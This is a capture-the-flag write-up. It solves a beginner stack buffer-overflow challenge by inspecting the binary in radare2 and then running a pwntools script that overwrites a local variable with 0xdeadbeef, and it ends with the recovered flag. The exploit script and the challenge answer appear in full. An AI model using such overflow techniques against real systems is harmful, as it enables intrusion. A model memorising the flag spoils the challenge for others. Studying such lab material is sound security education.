1. use `file <file>` to take a look. It's ELF file.

```
$ file pass
pass: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, 
interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=abcfeb57f2bcc8ad99fcba05bb6a05830c5e36d0, 
for GNU/Linux 3.2.0, not stripped
```

2. use `r2 <executable file>` to see the flow of the program.
  a. `aa`, `afl` to see the function of the binary.
  b. `s <function>` seek to the function.
  b. `VV` to see the function(we just set) flow in a graphic way.
  
3. by r2 VV command, we can see that var_20h is put at rbp-0x20, var_4h is at rbp-0x4.
![image](https://user-images.githubusercontent.com/66505819/139246455-3a32ff1c-f05b-4d58-b7a5-2976cc7d66b0.png)

4. keep looking, we find that the program store number 1234(0x4d2) at var_4h. And the program will compare it with 0xdeadbeef.
   if they are the same, program jump to Door open and we'll find the flag, or we fail.
![image](https://user-images.githubusercontent.com/66505819/139246670-c5619595-d225-4ea8-89e0-e1752fe65339.png)
![image](https://user-images.githubusercontent.com/66505819/139246794-227723d7-fe4c-4f59-92e5-b6c59ef32075.png)

5. Our input will be put at var_20h, and we need to change the data that store at var_4h, using boffer overflow. So, we have the script below.
```
from pwn import *

r = process('./pass')
#r = remote('120.114.62.211', 6126)

payload = b'A'*28

r.sendline(payload + p64(0xdeadbeef))  #if 64 bit ,or 32bit use p32

r.interactive()
```

6. run the script and get the flag.
```
$ python3 exploit.py
[+] Starting local process './pass': pid 162
[*] Switching to interactive mode
Billy left his key in the locked room.
However, he forgot the token of the room.
Do you know what's the key?Door open. OwO
FLAG{xtnntfhzflpttvxvzzbfjfnxbjvrzxdfvzlvhpt}
hello hacker!
[*] Process './pass' stopped with exit code 0 (pid 162)
[*] Got EOF while reading in interactive
$
```
the flag is: FLAG{xtnntfhzflpttvxvzzbfjfnxbjvrzxdfvzlvhpt}
